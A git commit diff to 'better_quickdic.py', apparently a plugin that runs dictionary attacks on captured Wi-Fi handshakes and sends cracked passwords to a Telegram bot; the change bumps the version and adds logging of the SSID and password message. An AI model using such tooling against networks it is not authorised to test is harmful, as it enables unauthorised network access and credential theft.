e8b290ca494cf9de6e277424aa87e074dc4c01f8
SilenTree12th <45297257+SilenTree12th@users.noreply.github.com>
2023-12-06 20:48:55 +0100

    Update better_quickdic.py

--- better_quickdic.py
+++ better_quickdic.py
@@ -17,7 +17,7 @@ Cracked handshakes stored in handshake folder as [essid].pcap.cracked
 
 class QuickDic(plugins.Plugin):
     __author__ = 'silentree12th'
-    __version__ = '1.4.0'
+    __version__ = '1.4.1'
     __license__ = 'GPL3'
     __description__ = 'Run a quick dictionary scan against captured handshakes. Optionally send found passwords as qrcode and plain text over to telegram bot.'
     __dependencies__ = {
@@ -121,6 +121,7 @@ class QuickDic(plugins.Plugin):
                         #bot.send_photo(chat_id=chat_id, photo=InputFile(image_bytes, filename=ssid+'-'+password+'.txt'), caption=message_text)
             message_text = f"SSID: {ssid}\nPassword: {password}\n```\n{q.read()}\n```"
             bot.send_message(chat_id=chat_id, text=message_text, parse_mode='Markdown')
+            logging.info(message_text)
             logging.info("[better_quickdic] QR code content sent to Telegram.")
 
         except Exception as e:
